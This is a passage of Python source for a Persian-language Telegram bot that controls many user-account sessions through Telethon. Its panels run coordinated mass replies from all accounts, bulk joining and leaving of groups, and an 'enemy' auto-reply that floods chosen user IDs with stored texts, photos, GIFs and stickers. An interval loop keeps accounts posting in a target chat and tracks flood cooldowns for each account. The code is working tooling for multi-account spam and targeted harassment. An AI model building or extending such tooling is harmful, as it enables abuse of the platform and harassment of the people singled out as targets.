      groups_db.setdefault(gname, {}).setdefault("rhythm", {})["target"] = chat_id_str
      save_groups()
      await event.answer(f" گپ {chat_id_str} انتخاب شد")
      await sp_edit(event, _rhm_panel_text(gname), buttons=_rhm_buttons(gname))

    # ── Rhythm: Emoji list ───────────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_rhme_(.+)")))
    async def og_rhme_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      emojis = groups_db.get(gname, {}).get("rhythm", {}).get("emojis", [])
      cur = " ".join(emojis) if emojis else "خالی"
      pending_group_selection[event.sender_id] = {"og_step": "rhythm_emoji", "og_gname": gname}
      await sp_edit(event,
          f" ایموجی Rhythm — {gname}\n"
          f"ایموجی‌های فعلی: {cur}\n\n"
          f"هر پیام یه ایموجی بفرست تا اضافه بشه.\n"
          f"ایموجی‌ها به صورت رندوم فرستاده میشن.\n"
          f"وقتی تموم شد /done بفرست.",
          buttons=[[Button.inline("❌ Cancel", f"og_rhmh_{gname}".encode())]])
      await event.answer()

    # ── Rhythm: Reply link ───────────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_rhmrl_(.+)")))
    async def og_rhmrl_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      pending_group_selection[event.sender_id] = {"og_step": "rhythm_replylink", "og_gname": gname}
      await sp_edit(event,
          f" Reply Link — {gname}\n\n"
          f"لینک پیامی که توی یه گروه هست رو بفرست.\n"
          f"اکانت‌ها باید عضو اون گروه باشن.\n\n"
          f"مثال:\n"
          f"https://t.me/mygroup/123\n"
          f"https://t.me/c/1234567890/123",
          buttons=[[Button.inline("❌ Cancel", f"og_rhmh_{gname}".encode())]])
      await event.answer()

    # ── Rhythm: Clear reply link ─────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_rhmclrrl_(.+)")))
    async def og_rhmclrrl_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      rhm = groups_db.setdefault(gname, {}).setdefault("rhythm", {})
      rhm.pop("reply_to", None)
      rhm.pop("target", None)
      rhm.pop("comment_mode", None)
      save_groups()
      await event.answer(" Reply Link پاک شد")
      await sp_edit(event, _rhm_panel_text(gname), buttons=_rhm_buttons(gname))

    # ── Rhythm: Clear emojis ─────────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_rhmclre_(.+)")))
    async def og_rhmclre_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      rhm = groups_db.setdefault(gname, {}).setdefault("rhythm", {})
      rhm["emojis"] = []
      save_groups()
      await event.answer(" ایموجی‌ها پاک شدن")
      await sp_edit(event, _rhm_panel_text(gname), buttons=_rhm_buttons(gname))

    # ── Rhythm: Clear text ───────────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_rhmclrt_(.+)")))
    async def og_rhmclrt_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      rhm = groups_db.setdefault(gname, {}).setdefault("rhythm", {})
      rhm["text"] = ""
      save_groups()
      await event.answer(" متن Rhythm پاک شد")
      await sp_edit(event, _rhm_panel_text(gname), buttons=_rhm_buttons(gname))

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_rhms_(.+)")))
    async def og_rhms_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      rhm = groups_db.get(gname, {}).get("rhythm", {})
      rhm_text = rhm.get("text", "")
      rhm_emojis = rhm.get("emojis", [])
      rhm_target = rhm.get("target", "")
      rhm_reply_to = rhm.get("reply_to")
      if not (rhm_text or rhm_emojis) or not rhm_target or not rhm_reply_to:
          await event.answer(" ابتدا متن (یا ایموجی) و گپ رو تنظیم کن", alert=True)
          return
      sessions = groups_db.get(gname, {}).get("sessions", [])
      await sp_edit(event,
          f" Rhythm در حال اجرا...\n {len(sessions)} سشن دارن پیام میفرستن",
          buttons=[[Button.inline("🔘 Please Wait...", b"noop")]])
      await event.answer()
      async def _resolve_rhm_entity(client, target_str: str):
          """Try multiple methods to resolve a chat entity for sending."""
          from telethon.tl import types as _tl_types
          from telethon.tl.functions.channels import GetChannelsRequest
          from telethon.tl.types import InputChannel
          target_str = target_str.strip()

          if target_str.lstrip("-").isdigit():
              target_int = int(target_str)

              # Method 1: direct get_entity (works if cached)
              try:
                    return await client.get_entity(target_int)
              except Exception:
                    pass

              # compute raw channel_id (strip -100 prefix)
              raw_id = abs(target_int)
              if raw_id > 1000000000000:
                    raw_id = raw_id - 1000000000000

              # Method 2: PeerChannel — works if session is a member and entity cached
              if target_int < 0:
                    try:
                        peer = _tl_types.PeerChannel(channel_id=raw_id)
                        return await client.get_entity(peer)
                    except Exception:
                        pass

                    # Method 3: GetChannels with access_hash=0 — works for joined channels
                    try:
                        result = await client(GetChannelsRequest([InputChannel(raw_id, 0)]))
                        if result.chats:
                            return result.chats[0]
                    except Exception:
                        pass

                    # Method 4: PeerChat for old-style groups
                    try:
                        peer = _tl_types.PeerChat(chat_id=raw_id)
                        return await client.get_entity(peer)
                    except Exception:
                        pass

                    # Method 5: InputPeerChannel with access_hash=0 — last resort
                    try:
                        from telethon.tl.types import InputPeerChannel
                        peer = InputPeerChannel(channel_id=raw_id, access_hash=0)
                        return await client.get_entity(peer)
                    except Exception:
                        pass

              return None
          else:
              # username or @handle
              target_clean = target_str.lstrip("@")
              try:
                    return await client.get_entity(target_clean)
              except Exception:
                    return None

      errors_log = []
      results = {"ok": 0, "fail": 0, "offline": 0}

      # فقط سشن‌های آنلاین رو اجرا کن — آفلاین‌ها رو روشن نمیکنیم
      online_sessions = [s for s in sessions if s in managed]
      offline_count = len(sessions) - len(online_sessions)

      async def _rhm_send_one(s):
          meta = managed.get(s)
          if not meta:
              return  # آفلاین — روشن نمیکنیم
          try:
              ent = await _resolve_rhm_entity(meta["client"], rhm_target)
              if ent is None:
                    raise ValueError(f"entity not found for: {rhm_target}")
              # choose message content: randomly pick text or emoji
              _pool = []
              if rhm_text:
                    _pool.append(("text", rhm_text))
              for _em in rhm_emojis:
                    _pool.append(("emoji", _em))
              _pick_type, _pick_val = random.choice(_pool) if _pool else ("text", "")
              # guard: never send empty message
              if not _pick_val or not _pick_val.strip():
                    log.warning(f"[rhythm] {s} skipped: empty pick_val")
                    results["fail"] += 1
                    errors_log.append(f"• {s}: ایموجی/متن خالی ذخیره شده — از پنل پاک و دوباره ست کن")
                    return

              # Telegram animated dice emoticons
              _DICE_EMOTICONS = {"🎲", "🎯", "🏀", "⚽", "🎰", "🎳"}
              _is_dice_emoji = _pick_type == "emoji" and _pick_val.strip() in _DICE_EMOTICONS
              _emoticon = _pick_val.strip()

              # ── send to group with reply_to (simple, no channel logic) ────
              from telethon.tl.types import InputMediaDice
              if _is_dice_emoji:
                    await meta["client"].send_file(
                        ent,
                        InputMediaDice(emoticon=_emoticon),
                        reply_to=rhm_reply_to
                    )
              else:
                    await meta["client"].send_message(
                        ent, _pick_val,
                        reply_to=rhm_reply_to
                    )
              results["ok"] += 1
          except Exception as _re:
              err_str = str(_re)[:80]
              log.warning(f"[rhythm] {s} failed: {_re}")
              errors_log.append(f"• {s}: {err_str}")
              results["fail"] += 1

      await asyncio.gather(*[_rhm_send_one(s) for s in online_sessions], return_exceptions=True)
      err_txt = "\n" + "\n".join(errors_log[:8]) if errors_log else ""
      offline_txt = f"\n⚫ آفلاین (رد شده): {offline_count}" if offline_count else ""
      await sp(event.chat_id,
          f" Rhythm تموم شد!\n━━━━━━━━━━━━━━\n موفق: {results['ok']}\n ناموفق: {results['fail']}\n آنلاین: {len(online_sessions)}{offline_txt}{err_txt}",
          buttons=[[Button.inline("🔘 Rhythm", f"og_rhmh_{gname}".encode()),
                      Button.inline("👥 Group", f"og_home_{gname}".encode())]])

    # join/leave panel
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_jl_(.+)")))
    async def og_jl_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      await sp_edit(event, f" Join / Leave — ریموت {gname}:", buttons=[
          [Button.inline("📌 Join All", f"og_jla_{gname}".encode()),
             Button.inline("📌 Leave All", f"og_lla_{gname}".encode())],
          [Button.inline("👤 Join One Account", f"og_jlo_{gname}".encode()),
             Button.inline("👤 Leave One Account", f"og_llo_{gname}".encode())],
          [Button.inline("🔙 Back", f"og_home_{gname}".encode())],
      ])
      await event.answer()

    for _act, _step in [(b"og_jla_", "join_all"), (b"og_lla_", "leave_all"),
                        (b"og_jlo_", "join_one"), (b"og_llo_", "leave_one")]:
      @bot.on(events.CallbackQuery(pattern=re.compile(rb"" + _act + rb"(.+)")))
      async def og_jl_action(event, __step=_step, __act=_act):
          gname = event.pattern_match.group(1).decode()   # ← باید قبل از guard باشه
          if not og_guard(event, gname):
              return await event.answer(" دسترسی ندارید", alert=True)
          pending_group_selection[event.sender_id] = {"og_step": __step, "og_gname": gname}
          lbl = "🟢 جوین" if "join" in __step else "🔴 لفت"
          await sp_edit(event, f"{lbl} — لینک یا @username گروه/کانال مقصد:",
                         buttons=[[Button.inline("❌ Cancel", f"og_jl_{gname}".encode())]])
          await event.answer()

    # IDs panel
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_ids_(.+)")))
    async def og_ids_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      rows = [[Button.inline(f"🗂 {'🟢' if s in managed else '🔴'} {s}", f"og_id1_{gname}|{s}".encode())]
              for s in og_sessions(gname)]
      rows.append([Button.inline("🔙 Back", f"og_home_{gname}".encode())])
      await sp_edit(event, f" IDs — ریموت {gname}:", buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_id1_([^|]+)\|(.+)")))
    async def og_id1_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      meta = managed.get(sess)
      ids = list(meta["state"].get("locked_users", set())) if meta else []
      txt = f"🏷️ {sess}:\n" + ("\n".join(f"• {x}" for x in ids) if ids else "— خالی —")
      await sp_edit(event, txt, buttons=[
          [Button.inline("➕ Add", f"og_idadd_{gname}|{sess}".encode()),
             Button.inline("🗑 Remove", f"og_iddel_{gname}|{sess}".encode())],
          [Button.inline("📌 Clear All", f"og_idclr_{gname}|{sess}".encode()),
             Button.inline("🔙 Back", f"og_ids_{gname}".encode())],
      ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_idadd_([^|]+)\|(.+)")))
    async def og_idadd_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      pending_group_selection[event.sender_id] = {"og_step": "idadd", "og_gname": gname, "og_sess": sess}
      await sp_edit(event, f" آیدی عددی برای {sess}:",
                     buttons=[[Button.inline("❌ Cancel", f"og_id1_{gname}|{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_iddel_([^|]+)\|(.+)")))
    async def og_iddel_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      pending_group_selection[event.sender_id] = {"og_step": "iddel", "og_gname": gname, "og_sess": sess}
      await sp_edit(event, f" آیدی برای حذف از {sess}:",
                     buttons=[[Button.inline("❌ Cancel", f"og_id1_{gname}|{sess}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_idclr_([^|]+)\|(.+)")))
    async def og_idclr_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      meta = managed.get(sess)
      if meta:
          meta["state"]["locked_users"] = set()
          save_session_state(sess, meta["state"])
      await event.answer(f" آیدی‌های {sess} پاک شد")
      await sp_edit(event, f" آیدی‌های {sess} پاک شدن.",
                     buttons=[[Button.inline("🔙 Back", f"og_ids_{gname}".encode())]])

    # ═══════════════════════════════════════════════════════════
    # OWNER GROUP: ENEMY / AUTO-REPLY PANEL  (og_enemy_ prefix)
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_enemy_(.+)")))
    async def og_enemy_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      rows = []
      for s in og_sessions(gname):
          meta = managed.get(s)
          ar = "✅" if (meta and meta["state"].get("auto_reply")) else "❌"
          dn = (meta["state"].get("display_name") or s) if meta else s
          rows.append([Button.inline(f"🔘 {ar} {dn}", f"og_en1_{gname}|{s}".encode())])
      rows.append([Button.inline("📌 Bulk Self (All Accounts)", f"og_bulkself_{gname}".encode())])
      rows.append([Button.inline("🔙 Back", f"og_home_{gname}".encode())])
      await sp_edit(event, f" پنل Self — ریموت {gname}:\n(=اتو-ریپلای فعال  |  IDs خالی=به هیچ‌کس جواب نمیده تا آیدی اضافه کنید)", buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_en1_([^|]+)\|(.+)")))
    async def og_en1_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      meta = managed.get(sess)
      ar = meta["state"].get("auto_reply", False) if meta else False
      enemies = list(meta["state"].get("locked_auto_reply", set())) if meta else []
      raw_media = meta["state"].get("self_reply_media", []) if meta else []
      texts = len(meta["state"].get("self_reply_text", [])) if meta else 0
      photos = sum(1 for m in raw_media if isinstance(m, dict) and m.get("type") == "photo")
      gifs_c = sum(1 for m in raw_media if isinstance(m, dict) and m.get("type") == "gif")
      vids = sum(1 for m in raw_media if isinstance(m, dict) and m.get("type") == "video")
      stickers_c = sum(1 for m in raw_media if isinstance(m, dict) and m.get("type") == "sticker")
      dn = (meta["state"].get("display_name") or sess) if meta else sess
      txt = (
          f" Self — {dn}\n━━━━━━━━━━━━━━\n"
          f"اتو-ریپلای: {'✅ فعال' if ar else '❌ غیرفعال'}\n"
          f"آیدی‌ها: {', '.join(str(x) for x in enemies) or '—'}\n"
          f" Photo: {photos}   GIF: {gifs_c}   Video: {vids}   Sticker: {stickers_c}   متن: {texts}"
      )
      toggle_lbl = "⏹ خاموش Self" if ar else " روشن Self"
      await sp_edit(event, txt, buttons=[
          [Button.inline(toggle_lbl, f"og_entgl_{gname}|{sess}".encode())],
          [Button.inline("➕ Add ID", f"og_enadd_{gname}|{sess}".encode()),
             Button.inline("🗑 Remove ID", f"og_endel_{gname}|{sess}".encode())],
          [Button.inline("📌 Clear All IDs", f"og_enclr_{gname}|{sess}".encode()),
             Button.inline("➕ Add Text", f"og_enfosh_{gname}|{sess}".encode())],
          [Button.inline(f"🖼 Upload Photo ({photos})", f"og_enmedia_photo_{gname}|{sess}".encode()),
             Button.inline(f"🖼 Upload GIF ({gifs_c})", f"og_enmedia_gif_{gname}|{sess}".encode())],
          [Button.inline(f"🖼 Upload Video ({vids})", f"og_enmedia_video_{gname}|{sess}".encode()),
             Button.inline(f"🖼 Upload Sticker ({stickers_c})", f"og_enmedia_sticker_{gname}|{sess}".encode())],
          [Button.inline("🗑 Delete Photos", f"og_enclrtype_photo_{gname}|{sess}".encode()),
             Button.inline("🗑 Delete GIFs", f"og_enclrtype_gif_{gname}|{sess}".encode())],
          [Button.inline("🗑 Delete Videos", f"og_enclrtype_video_{gname}|{sess}".encode()),
             Button.inline("🗑 Delete Stickers", f"og_enclrtype_sticker_{gname}|{sess}".encode())],
          [Button.inline("🗑 Delete Texts", f"og_enclrtext_{gname}|{sess}".encode()),
             Button.inline("📌 Clear All Media", f"og_enclrmedia_{gname}|{sess}".encode())],
          [Button.inline("🔙 Back", f"og_enemy_{gname}".encode())],
      ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_entgl_([^|]+)\|(.+)")))
    async def og_entgl_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      meta = managed.get(sess)
      if not meta:
          return await event.answer(" آفلاین")
      meta["state"]["auto_reply"] = not meta["state"].get("auto_reply", False)
      save_session_state(sess, meta["state"])
      st = "✅ فعال" if meta["state"]["auto_reply"] else "❌ غیرفعال"
      await event.answer(f"اتو-ریپلای {sess}: {st}")
      await sp_edit(event, f"اتو-ریپلای {sess} → {st}",
                     buttons=[[Button.inline("🔙 Back", f"og_en1_{gname}|{sess}".encode())]])

    # ═══════════════════════════════════════════════════════════
    # BULK SELF — configure all accounts in a group at once
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bulkself_(.+)")))
    async def og_bulkself_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess_list = og_sessions(gname)
      on_cnt = sum(1 for s in sess_list if s in managed)
      ar_cnt = sum(1 for s in sess_list if managed.get(s) and managed[s]["state"].get("auto_reply"))
      sample = next((managed[s] for s in sess_list if managed.get(s)), None)
      media_cnt = len(sample["state"].get("self_reply_media", [])) if sample else 0
      text_cnt = len(sample["state"].get("self_reply_text", [])) if sample else 0
      _bloop_task = _bself_loop_tasks.get(gname)
      _bloop_on = _bloop_task and not _bloop_task.done()
      _bloop_interval = groups_db.get(gname, {}).get("bself_interval", 30)
      _bloop_target = groups_db.get(gname, {}).get("bself_target", "—")
      _bloop_status = f"🟢 روشن | هر {_bloop_interval}s | هدف: {_bloop_target}" if _bloop_on else f"🔴 خاموش | تنظیم: {_bloop_interval}s"
      txt = (
          f" Bulk Self — ریموت {gname}\n"
          f"━━━━━━━━━━━━━━\n"
          f" {len(sess_list)} اکانت   {on_cnt} آنلاین\n"
          f" Auto-Reply روشن: {ar_cnt}\n"
          f" Text (نمونه): {text_cnt}  |   Media (نمونه): {media_cnt}\n"
          f" Interval Reply: {_bloop_status}\n\n"
          f" تنظیمات روی همه اکانت‌های ریموت اعمال میشه."
      )
      await sp_edit(event, txt, buttons=[
          [Button.inline("📌 Enable All Auto-Reply", f"og_bself_allon_{gname}".encode()),
             Button.inline("📌 Disable All Auto-Reply", f"og_bself_alloff_{gname}".encode())],
          [Button.inline("📌 Set Text (All)", f"og_bself_text_{gname}".encode())],
          [Button.inline("📌 Set Enemy ID (All)", f"og_bself_setid_{gname}".encode()),
             Button.inline("📌 Clear Enemy IDs (All)", f"og_bself_clrid_{gname}".encode())],
          [Button.inline("📌 Upload Photo (All)", f"og_bself_media_photo_{gname}".encode()),
             Button.inline("📌 Upload GIF (All)", f"og_bself_media_gif_{gname}".encode())],
          [Button.inline("📌 Upload Video (All)", f"og_bself_media_video_{gname}".encode()),
             Button.inline("📌 Upload Sticker (All)", f"og_bself_media_sticker_{gname}".encode())],
          [Button.inline("📌 Clear Texts (All)", f"og_bself_clrtext_{gname}".encode()),
             Button.inline("📌 Clear Media (All)", f"og_bself_clrmedia_{gname}".encode())],
          [Button.inline("⚙️ تنظیم Interval Reply", f"og_bself_looppanel_{gname}".encode())],
          [Button.inline("🔙 Back", f"og_enemy_{gname}".encode())],
      ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bself_allon_(.+)")))
    async def og_bself_allon_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      cnt = 0
      for s in og_sessions(gname):
          meta = managed.get(s)
          if meta:
              meta["state"]["auto_reply"] = True
              save_session_state(s, meta["state"])
          else:
              # offline: patch on-disk state
              st = load_session_state(s)
              st["auto_reply"] = True
              save_session_state(s, st)
          cnt += 1
      await event.answer(f" {cnt} اکانت روشن شد")
      await sp_edit(event, f" Auto-Reply روی {cnt} اکانت فعال شد.",
                     buttons=[[Button.inline("🔙 Back", f"og_bulkself_{gname}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bself_alloff_(.+)")))
    async def og_bself_alloff_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      cnt = 0
      for s in og_sessions(gname):
          meta = managed.get(s)
          if meta:
              meta["state"]["auto_reply"] = False
              save_session_state(s, meta["state"])
          else:
              st = load_session_state(s)
              st["auto_reply"] = False
              save_session_state(s, st)
          cnt += 1
      await event.answer(f" {cnt} اکانت خاموش شد")
      await sp_edit(event, f" Auto-Reply روی {cnt} اکانت غیرفعال شد.",
                     buttons=[[Button.inline("🔙 Back", f"og_bulkself_{gname}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bself_setid_(.+)")))
    async def og_bself_setid_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      pending_group_selection[event.sender_id] = {"og_step": "bself_setid", "og_gname": gname}
      await sp_edit(event,
          f" Set Enemy ID — ریموت {gname}:\n"
          f"آیدی عددی کاربر هدف رو بفرست.\n"
          f"می‌تونی چند تا آیدی رو با فاصله یا کاما جدا کنی (مثال: 123456 789012 345678)\n"
          f"Auto-Reply فقط روی این افراد ریپلای میکنه.\n"
          f"(به لیست موجود هر اکانت اضافه میشه)",
          buttons=[[Button.inline("❌ Cancel", f"og_bulkself_{gname}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bself_clrid_(.+)")))
    async def og_bself_clrid_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      cnt = 0
      for s in og_sessions(gname):
          meta = managed.get(s)
          if meta:
              meta["state"]["locked_auto_reply"] = set()
              save_session_state(s, meta["state"])
          else:
              st = load_session_state(s)
              st["locked_auto_reply"] = []
              save_session_state(s, st)
          cnt += 1
      await event.answer(f" {cnt} اکانت پاک شد")
      await sp_edit(event, f" Enemy ID‌ها از {cnt} اکانت پاک شد.",
                     buttons=[[Button.inline("🔙 Back", f"og_bulkself_{gname}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bself_text_(.+)")))
    async def og_bself_text_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      pending_group_selection[event.sender_id] = {"og_step": "bself_text", "og_gname": gname}
      await sp_edit(event,
          f" متن Bulk Self — ریموت {gname}:\n"
          f"هر پیام رو جداگانه بفرست.\n"
          f"وقتی تموم شد /done بفرست.\n"
          f"(به لیست موجود هر اکانت اضافه میشه)",
          buttons=[[Button.inline("❌ Cancel", f"og_bulkself_{gname}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bself_clrtext_(.+)")))
    async def og_bself_clrtext_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      cnt = 0
      for s in og_sessions(gname):
          meta = managed.get(s)
          if meta:
              meta["state"]["self_reply_text"] = []
              save_session_state(s, meta["state"])
              cnt += 1
      await event.answer(f" {cnt} اکانت")
      await sp_edit(event, f" متن {cnt} اکانت پاک شد.",
                     buttons=[[Button.inline("🔙 Back", f"og_bulkself_{gname}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bself_clrmedia_(.+)")))
    async def og_bself_clrmedia_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      cnt = 0
      for s in og_sessions(gname):
          meta = managed.get(s)
          if meta:
              meta["state"]["self_reply_media"] = []
              save_session_state(s, meta["state"])
              cnt += 1
      await event.answer(f" {cnt} اکانت")
      await sp_edit(event, f" Media {cnt} اکانت پاک شد.",
                     buttons=[[Button.inline("🔙 Back", f"og_bulkself_{gname}".encode())]])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bself_media_(photo|gif|video|sticker)_(.+)")))
    async def og_bself_media_cb(event):
      mtype = event.pattern_match.group(1).decode()
      gname = event.pattern_match.group(2).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      pending_group_selection[event.sender_id] = {"og_step": "bself_media", "og_gname": gname, "og_mtype": mtype}
      await sp_edit(event,
          f" آپلود {mtype} برای Bulk Self — ریموت {gname}:\n"
          f"فایل بفرست (میتونی چند تا بفرستی).\n"
          f"بعد از هر فایل کپشن بفرست یا /skip.\n"
          f"وقتی تموم شد /done بفرست.",
          buttons=[[Button.inline("❌ Cancel", f"og_bulkself_{gname}".encode())]])
      await event.answer()

    # ═══════════════════════════════════════════════════════════
    # INTERVAL SELF-REPLY — each account replies to its own last msg
    # ═══════════════════════════════════════════════════════════
    def _bself_loop_panel_text(gname):
      task = _bself_loop_tasks.get(gname)
      is_on = task and not task.done()
      interval = groups_db.get(gname, {}).get("bself_interval", 30)
      target = groups_db.get(gname, {}).get("bself_target", "—")
      status = pe('🟢') + " روشن" if is_on else pe('🔴') + " خاموش"
      return (
          f"{pe('🔁')} <b>Interval Reply — ریموت {gname}</b>\n"
          f"━━━━━━━━━━━━━━\n"
          f"وضعیت: {status}\n"
          f"فاصله زمانی: <b>{interval} ثانیه</b>\n"
          f"گپ هدف: <code>{target}</code>\n\n"
          f"هر اکانت هر {interval} ثانیه به آخرین پیام خودش در گپ هدف ریپلای میزنه."
      )

    def _bself_loop_panel_buttons(gname):
      task = _bself_loop_tasks.get(gname)
      is_on = task and not task.done()
      toggle_btn = (
          Button.inline("🔴 Stop", f"og_bself_loopstop_{gname}".encode())
          if is_on else
          Button.inline("🟢 Start", f"og_bself_loopstart_{gname}".encode())
      )
      return [
          [toggle_btn],
          [Button.inline("⚙️ تنظیم Interval (ثانیه)", f"og_bself_loopiv_{gname}".encode()),
             Button.inline("⚙️ تنظیم گپ هدف", f"og_bself_looptgt_{gname}".encode())],
          [Button.inline("🔙 Back", f"og_bulkself_{gname}".encode())],
      ]

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bself_looppanel_(.+)")))
    async def og_bself_looppanel_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      await sp_edit(event, _bself_loop_panel_text(gname), buttons=_bself_loop_panel_buttons(gname), parse_mode="html")
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bself_loopiv_(.+)")))
    async def og_bself_loopiv_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      pending_group_selection[event.sender_id] = {"og_step": "bself_interval", "og_gname": gname}
      await sp_edit(event,
          f" فاصله زمانی Interval Reply — ریموت {gname}:\n"
          f"عدد ثانیه بفرست (مثال: 30 یا 1.5)\n"
          f"حداقل: 1 ثانیه",
          buttons=[[Button.inline("❌ Cancel", f"og_bself_looppanel_{gname}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bself_looptgt_(.+)")))
    async def og_bself_looptgt_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      pending_group_selection[event.sender_id] = {"og_step": "bself_target", "og_gname": gname}
      await sp_edit(event,
          f" گپ هدف Interval Reply — ریموت {gname}:\n"
          f"آیدی عددی یا @username گپ/کانال/گروه هدف رو بفرست.",
          buttons=[[Button.inline("❌ Cancel", f"og_bself_looppanel_{gname}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_bself_loopstart_(.+)")))
    async def og_bself_loopstart_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer("")
      target_raw = groups_db.get(gname, {}).get("bself_target", "")
      if not target_raw or target_raw == "—":
          return await event.answer(" اول گپ هدف رو تنظیم کن", alert=True)

      # cancel old task if any
      old = _bself_loop_tasks.get(gname)
      if old and not old.done():
          old.cancel()

      async def _bself_iv_loop():
          _bself_flood_cd: Dict[str, float] = {}  # sname -> epoch cooldown expires
          while True:
              try:
                    interval = max(1, float(groups_db.get(gname, {}).get("bself_interval", 30)))
                    tgt_raw = groups_db.get(gname, {}).get("bself_target", "")
                    if not tgt_raw or tgt_raw == "—":
                        await asyncio.sleep(5)
                        continue
                    # parse target
                    _r = tgt_raw.strip()
                    for _p in ("https://t.me/", "http://t.me/", "t.me/"):
                        if _r.startswith(_p):
                            _r = _r[len(_p):]
                    _r = _r.lstrip("@")
                    try:
                        tgt = int(_r)
                    except ValueError:
                        tgt = _r if _r else None
                    if not tgt:
                        await asyncio.sleep(5)
                        continue

                    # ── sequential: each account sends, then waits interval ──
                    for sname in list(og_sessions(gname)):
                        # re-read interval each iteration (in case changed mid-run)
                        interval = max(1, float(groups_db.get(gname, {}).get("bself_interval", 30)))

                        # check if loop was stopped externally
                        task = _bself_loop_tasks.get(gname)
                        if not task or task.done() or task.cancelled():
                            return

                        # skip if in flood cooldown
                        if time.time() < _bself_flood_cd.get(sname, 0):
                            continue

                        meta = managed.get(sname)
                        if not meta:
                            continue
                        c = meta["client"]
                        st = meta["state"]
                        my_uid = meta.get("uid")
                        if not my_uid:
                            continue

                        # build content pool
                        raw_media = st.get("self_reply_media", [])
                        text_list = st.get("self_reply_text", [])
                        all_media = [
                            (m if isinstance(m, dict) else {"path": m, "type": "photo"})
                            for m in raw_media
                            if os.path.exists((m if isinstance(m, str) else m.get("path", "")))
